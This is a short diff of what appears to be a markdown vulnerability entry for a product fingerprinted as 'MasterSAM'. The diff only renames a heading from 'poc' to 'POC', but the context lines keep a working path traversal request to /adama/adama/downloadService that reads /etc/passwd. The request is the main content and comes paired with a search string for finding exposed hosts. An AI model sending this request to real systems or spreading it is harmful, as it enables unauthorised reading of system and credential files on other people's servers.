@@ -8,7 +8,7 @@
 body="MasterSAM"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1
